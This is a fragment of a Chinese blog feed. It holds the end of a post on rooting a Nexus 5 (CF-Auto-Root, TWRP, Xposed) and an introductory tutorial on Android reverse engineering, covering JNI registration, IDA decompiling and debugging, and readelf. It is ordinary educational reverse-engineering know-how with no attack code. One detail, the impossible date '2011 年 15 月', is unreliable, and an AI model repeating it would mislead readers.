class="line"></span><br><span class="line">Press Ctrl+C to cancel !</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">If you just unlocked for the first time, it is advised to boot the device into</span><br><span class="line">Android before continuing. This first boot may take several minutes, sometimes</span><br><span class="line">even half an hour.</span><br><span class="line"></span><br><span class="line">If you decide to boot back into Android first, return your device to</span><br><span class="line">bootloader/fastboot mode before continuing again.</span><br><span class="line"></span><br><span class="line">Press Ctrl+C to cancel !</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----- ----- ----- ----- ----- ----- -----</span><br><span class="line"></span><br><span class="line">We will now attempt to boot CF-Auto-Root. You should see a red Android on the</span><br><span class="line">screen of your device in a minute, with scrolling white text on top of it.</span><br><span class="line"></span><br><span class="line">Sending &apos;boot.img&apos; (15868 KB)                      OKAY [  0.605s]</span><br><span class="line">Booting                                            OKAY [  0.121s]</span><br><span class="line">Finished. Total time: 0.747s</span><br><span class="line"></span><br><span class="line">If nothing happens even after several minutes, something may be wrong.</span><br><span class="line"></span><br><span class="line">Once CF-Auto-Root is done, it will reboot your device. Keep in mind that your</span><br><span class="line">device may reboot a number of times, and it may be a few minutes before you</span><br><span class="line">are back into Android. It is important that you do not interrupt this process,</span><br><span class="line">unless it takes more than five minutes in total.</span><br><span class="line"></span><br><span class="line">Press ENTER to continue</span><br></pre></td></tr></table></figure><p>成功后，手机会出现一个红色的安卓标志：</p><p><img src="/pics/Nexus5刷机、Root并安装Xposed框架/4.png" alt="Root成功"></p><p>打开手机后，会发现多了一个 app 叫 SuperSu。使用 adb 连接，并用 su 命令切换到 root：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # id</span><br><span class="line">uid=0(root) gid=0(root) context=u:r:init:s0</span><br><span class="line">root@hammerhead:/ #</span><br></pre></td></tr></table></figure><h1 id="TWRP"><a href="#TWRP" class="headerlink" title="TWRP"></a>TWRP</h1><p>下载 <a href="https://twrp.me/lg/lgnexus5.html" target="_blank" rel="noopener">twrp-3.3.1-0-hammerhead.img</a>，进入 bootloader，并用 fastboot 刷入这个第三方 Recovery，然后重启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ adb reboot bootloader</span><br><span class="line">$ fastboot flash recovery twrp-3.3.1-0-hammerhead.img</span><br><span class="line">Sending &apos;recovery&apos; (13290 KB)                      OKAY [  0.630s]</span><br><span class="line">Writing &apos;recovery&apos;                                 OKAY [  1.040s]</span><br><span class="line">Finished. Total time: 1.863s</span><br><span class="line"></span><br><span class="line">$ fastboot reboot</span><br><span class="line">Rebooting                                          OKAY [  0.001s]</span><br><span class="line">Finished. Total time: 0.001s</span><br></pre></td></tr></table></figure><h1 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h1><p>Android 4.0.3~Android 4.4 的版本不支持 sdk21 及以上的版本，通过直接下载 <a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">Xposed Installer</a> 来安装 Xposed 框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ adb install apks/de.robv.android.xposed.installer_v33_36570c.apk</span><br><span class="line">Performing Push Install</span><br><span class="line">apks/de.robv.android.xposed.installer_v33_36570c.apk: 1 file pushed. 6.7 MB/s (788771 bytes in 0.113s)</span><br><span class="line">pkg: /data/local/tmp/de.robv.android.xposed.installer_v33_36570c.apk</span><br><span class="line">Success</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bodkin.ren/index.php/archives/513/" target="_blank" rel="noopener">https://www.bodkin.ren/index.php/archives/513/</a><br><a href="https://jilu.wiki/d/177" target="_blank" rel="noopener">https://jilu.wiki/d/177</a><br><a href="https://blog.csdn.net/feiniao8651/article/details/70083246/" target="_blank" rel="noopener">https://blog.csdn.net/feiniao8651/article/details/70083246/</a><br><a href="https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193" target="_blank" rel="noopener">https://forum.xda-developers.com/general/xda-assist/xposed-sdk-19-t3311193</a><br><a href="https://sspai.com/post/24538" target="_blank" rel="noopener">https://sspai.com/post/24538</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在闲鱼上从羊毛党那里买了部 Nexus 5（代号 hammerhead），记录第一次尝试刷机和 root（一开始不是很懂各种知识，所以没有记录下原本系统的版本等各种信息）。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（二）</title>
    <link href="blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/01/31/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2020-01-31T08:10:49.000Z</published>
    <updated>2020-02-12T14:28:59.450Z</updated>
    
    <content type="html"><![CDATA[<p>Android JNI 编程及 ARM 汇编入门。</p><a id="more"></a><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>Android Studio 3.5.3</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>Android 程序分两层，Java 层和 Native 层。Java 层就是 Java 代码编译为 dex 文件，而 Native 层则是 C++ 代码编译为 so 文件（动态库）。两者使用 JNI（Java Native Interface）来进行链接。相比于 Java，Native 层安全性更加高，隐蔽性更加好，某种情况下效率更加高。Java 是跨平台的语言，而这跨平台的背后都是依靠 Java 虚拟机，虚拟机采用 C/C++ 编写，适配各个系统，通过 JNI 为上层 Java 提供各种服务，保证跨平台性。Java 程序中通过 JVM 加载并调用 JNI 程序来间接地调用目标原生函数。</p><p><img src="/pics/Android逆向入门/二/1.png" alt="Java通过调用JNI程序来调用原声函数"></p><p>如果要进行 JNI 开发，直接在 Android Studio 中新建一个 C++ 项目即可。在调试过程中，可以新建一个 <code>log.h</code> 定义几个在 C++ 文件中进行日志输出的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LOG_TAG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_TAG <span class="meta-string">"MY_TAG"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGF(...) __android_log_print(ANDROID_LOG_FATAL, LOG_TAG, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在 Java 文件中添加日志输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        Log.d(<span class="string">"Debug"</span>, <span class="string">"infomation"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在需要调用 JNI 的函数中加载动态库：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Used to load the 'native-lib' library on application startup.</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native-lib"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Native-函数注册"><a href="#Native-函数注册" class="headerlink" title="Native 函数注册"></a>Native 函数注册</h2><h3 id="静态注册"><a href="#静态注册" class="headerlink" title="静态注册"></a>静态注册</h3><p>静态注册的理解和使用方式简单，出错率低。但必须遵循注册规则，当需要更改类名、包名或者方法时，需要按照之前方法重新生成头文件，灵活性不高。</p><p>Java 文件中的 Native 声明：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>静态注册在 cpp 文件中通过 JNIEXPORT 和 JNICALL 两个宏定义声明，在虚拟机加载 so 时发现上面两个宏定义的函数时就会链接到对应的 native 方法。so 中的名字为类名 + 函数名的组合，并且自带两个参数，即 <code>JNIEnv* env</code> 和 <code>jclass</code>（static 方法时）/<code>jobject</code>（普通方法时）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"log.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line">Java_com_assassinq_easycpp_MainActivity_sayHello(JNIEnv *env, jobject obj) &#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态注册有一些缺点：</p><ol><li>Native 函数名称特别长，不利于书写；</li><li>每次新增或删除接口时需要重新生成文件，比较繁琐；</li><li>第一次调用时需要根据函数名建立索引，影响效率；</li><li>JNI 层的函数名是由 Java 接口名生成，很容易通过 hook 调用动态库中的函数。</li></ol><h3 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h3><p>动态注册在 JNI 层通过重载 <code>JNI_OnLoad()</code> 函数来实现，系统初始化 JNI 在加载时，会调用 <code>JNI_OnLoad()</code>，而卸载时会调用 <code>JNI_UnLoad()</code>。原理是通过自定义方法把 C/C++ 函数映射到 JAVA 定义的方法，不需要通过 JAVA 方法名查找匹配 Native 函数名，也就不需要遵循静态注册的命名规则。</p><p>cpp 文件中的函数定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jstring <span class="title">sayHi</span><span class="params">(JNIEnv *env, jobject obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Hi World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过内置函数 <code>RegisterNatives()</code> 实现自定义的注册方法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv *env, <span class="keyword">const</span> <span class="keyword">char</span> *className, JNINativeMethod *gMethods, <span class="keyword">int</span> numMethods)</span> </span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(className);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义 gClassName 和 gMethods 两个变量，分别表示需要查找的类名和需要注册的方法信息：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *gClassName = <span class="string">"com/assassinq/easycpp/MainActivity"</span>;</span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">"sayHi"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) sayHi&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中方法信息的结构体如下，第一个变量为方法名，第二个变量为方法签名（字符串类型，以 Smali 代码的方式），第三个变量为对应的函数指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name; <span class="comment">// native 的方法名</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* signature; <span class="comment">// 方法签名，例如 ()Ljava/lang/String;</span></span><br><span class="line">    <span class="keyword">void</span>*       fnPtr; <span class="comment">// 函数指针</span></span><br><span class="line">&#125; JNINativeMethod;</span><br></pre></td></tr></table></figure><p>最后重写 <code>JNI_OnLoad()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv((<span class="keyword">void</span> **)&amp;env, JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        LOGE(<span class="string">"This jni version is not supported"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (registerNativeMethods(env, gClassName, gMethods, <span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])) == JNI_FALSE) &#123;</span><br><span class="line">        LOGE(<span class="string">"Unable to register native methods"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGE(<span class="string">"Methods loaded successfully"</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so-动态链接库"><a href="#so-动态链接库" class="headerlink" title="so 动态链接库"></a>so 动态链接库</h2><p>在编译过程中，可以修改 app 目录下的 build.gradle 中的内容，使用 android.defaultConfig.ndk.abiFilters 来指示 Gradle 要构建和打包的 ABI 版本，生成不同架构下的动态链接库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        ndk &#123;</span><br><span class="line">            abiFilters &quot;armeabi-v7a&quot;, &quot;arm64-v8a&quot;, &quot;x86&quot;, &quot;x86_64&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>so 文件一般存放在 apk 的 lib 目录下（NDK r17 版本开始已经去掉了 armeabi、mips、mips64 的 ABI 支持）：</p><ul><li>armeabi-v7a：第 7 代及以上的 ARM 处理器。2011 年 15 月以后的生产的大部分 Android 设备都使用它。</li><li>arm64-v8a：第 8 代、64 位 ARM 处理器，很少设备，三星 Galaxy S6 是其中之一。</li><li>armabi：第 5 代、第 6 代的 ARM 处理器，早期的手机用的比较多。</li><li>x86：Intel x86（平板、模拟器用得比较多）。</li><li>x86_64：Intel x64（64 位的平板）。</li><li>…</li></ul><h2 id="IDA-反编译-so-文件"><a href="#IDA-反编译-so-文件" class="headerlink" title="IDA 反编译 so 文件"></a>IDA 反编译 so 文件</h2><p>用 IDA 打开编译后的 apk，可以看到 lib 中存在一个 libnative-lib.so：</p><p><img src="/pics/Android逆向入门/二/2.png" alt="拖进IDA"></p><p>查看静态注册函数的反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">Java_com_assassinq_easycpp_MainActivity_sayHello</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _JNIEnv::NewStringUTF(a1, <span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看动态注册的函数的反编译结果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sayHi</span><span class="params">(_JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> _JNIEnv::NewStringUTF(a1, <span class="string">"Hi World"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="IDA-动态调试-apk"><a href="#IDA-动态调试-apk" class="headerlink" title="IDA 动态调试 apk"></a>IDA 动态调试 apk</h1><ol><li>安装 apk 到手机：<code>adb install example.apk</code></li><li>将 IDA 目录下的调试文件 push 到手机上：<code>adb push android_server /data/local/tmp</code></li><li>赋给程序可执行权限：<code>chmod 777 android_server</code></li><li>启动调试服务端：<code>./android_server</code> （自定义设置端口方式：<code>-p23333</code>）</li><li>手机端端口转发至电脑端：<code>adb forward tcp:[pc_port] tcp:[mobile_port]</code></li><li>IDA 调试端口设置：Debugger-&gt;Process option</li><li>启动程序：<code>adb shell am start -D -n packageName/activityName</code></li><li>IDA 挂接到 Native 层：Debugger-&gt;Attach to process…</li><li>打开 monitor，监听并挂接到 JAVA 层：<code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></li></ol><p><img src="/pics/Android逆向入门/二/3.png" alt="成功调试JNI的界面"></p><p>PS：如果在 monitor 中没有找到对应的进程，检查一下调试的程序中 AndroidManifest.xml 中是否设置了 <code>android:debuggable=&quot;true&quot;</code>（若没有则修改后并重新打包）。</p><h1 id="动态链接库文件（-so-文件）"><a href="#动态链接库文件（-so-文件）" class="headerlink" title="动态链接库文件（.so 文件）"></a>动态链接库文件（.so 文件）</h1><p>加载顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init_array -&gt; JNI_OnLoad -&gt; ... -&gt; fini_array</span><br></pre></td></tr></table></figure><h2 id="so-文件查看工具"><a href="#so-文件查看工具" class="headerlink" title="so 文件查看工具"></a>so 文件查看工具</h2><h3 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h3><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-a</code></td><td style="text-align:center">显示 so 文件的所有信息</td></tr><tr><td style="text-align:center"><code>-h</code></td><td style="text-align:center">显示 ELF 文件头</td></tr><tr><td style="text-align:center"><code>-l</code></td><td style="text-align:center">显示 Program Headers，动态加载时需要的信息</td></tr><tr><td style="text-align:center"><code>-S</code></td><td style="text-align:center">显示 Section Headers，静态加载分析时需要的信息</td></tr><tr><td style="text-align:center"><code>-e</code></td><td style="text-align:center">显示 ELF Header、Section Headers、Program Headers 信息</td></tr><tr><td style="text-align:center"><code>-s</code></td><td style="text-align:center">显示符号表（Symbol Table）</td></tr><tr><td style="text-align:center"><code>-d</code></td><td style="text-align:center">显示动态节区（Dynamic Section）</td></tr></tbody></table><p>显示 ELF 文件头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h libnative-lib.so</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">'s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           ARM</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x0</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          12932 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x5000200, Version5 EABI, soft-float ABI</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         8</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         27</span></span><br><span class="line"><span class="string">  Section header string table index: 26</span></span><br></pre></td></tr></table></figure><p>显示 Program headers：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -l libnative-lib.so</span><br><span class="line"></span><br><span class="line">Elf file <span class="built_in">type</span> is DYN (Shared object file)</span><br><span class="line">Entry point 0x0</span><br><span class="line">There are 8 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x02ab6 0x02ab6 R E 0x1000</span><br><span class="line">  LOAD           0x002e3c 0x00003e3c 0x00003e3c 0x001dc 0x001dd RW  0x1000</span><br><span class="line">  DYNAMIC        0x002e8c 0x00003e8c 0x00003e8c 0x00110 0x00110 RW  0x4</span><br><span class="line">  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  EXIDX          0x0021f4 0x000021f4 0x000021f4 0x001b8 0x001b8 R   0x4</span><br><span class="line">  GNU_RELRO      0x002e3c 0x00003e3c 0x00003e3c 0x001c4 0x001c4 RW  0x4</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .<span class="built_in">hash</span> .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata</span><br><span class="line">   02     .fini_array .data.rel.ro .dynamic .got .data .bss</span><br><span class="line">   03     .dynamic</span><br><span class="line">   04     .note.android.ident .note.gnu.build-id</span><br><span class="line">   05</span><br><span class="line">   06     .ARM.exidx</span><br><span class="line">   07     .fini_array .data.rel.ro .dynamic .got</span><br></pre></td></tr></table></figure><p>显示 Section headers：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S libnative-lib.so</span><br><span class="line">There are 27 section headers, starting at offset 0x3284:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .note.android.ide NOTE            00000134 000134 000098 00   A  0   0  4</span><br><span class="line">  [ 2] .note.gnu.build-i NOTE            000001cc 0001cc 000024 00   A  0   0  4</span><br><span class="line">  [ 3] .dynsym           DYNSYM          000001f0 0001f0 000190 10   A  4   1  4</span><br><span 